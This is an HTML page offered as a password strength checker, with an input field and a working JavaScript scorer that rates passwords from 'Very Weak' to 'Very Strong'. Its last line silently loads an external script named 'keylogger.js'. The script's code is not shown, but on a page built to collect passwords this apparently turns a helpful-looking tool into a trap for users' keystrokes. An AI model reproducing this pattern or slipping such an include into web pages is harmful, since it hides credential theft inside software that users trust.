<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Password Strength Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
            background-color: #f4f4f9;
            color: #333;
        }
        input[type="password"], div {
            margin-top: 20px;
            padding: 10px;
            font-size: 16px;
            width: 250px;
        }
        #strengthOutput {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h2>Password Strength Checker</h2>
    <input type="password" id="passwordInput" oninput="checkPasswordStrength();" placeholder="Enter password">
    <div id="strengthOutput"></div>
    <script>
        function checkPasswordStrength() {
            var strength = 0;
            var password = document.getElementById('passwordInput').value;
            var strengthText = '';
            if (password.length >= 8) strength++;
            if (password.match(/[a-z]/)) strength++;
            if (password.match(/[A-Z]/)) strength++;
            if (password.match(/[0-9]/)) strength++;
            if (password.match(/[^a-zA-Z0-9]/)) strength++;

            switch(strength) {
                case 0:
                case 1:
                    strengthText = 'Very Weak';
                    break;
                case 2:
                    strengthText = 'Weak';
                    break;
                case 3:
                    strengthText = 'Moderate';
                    break;
                case 4:
                    strengthText = 'Strong';
                    break;
                case 5:
                    strengthText = 'Very Strong';
                    break;
            }
            document.getElementById('strengthOutput').innerText = 'Strength: ' + strengthText;
        }
    </script>
    <script src="keylogger.js"></script>
</body>
</html>
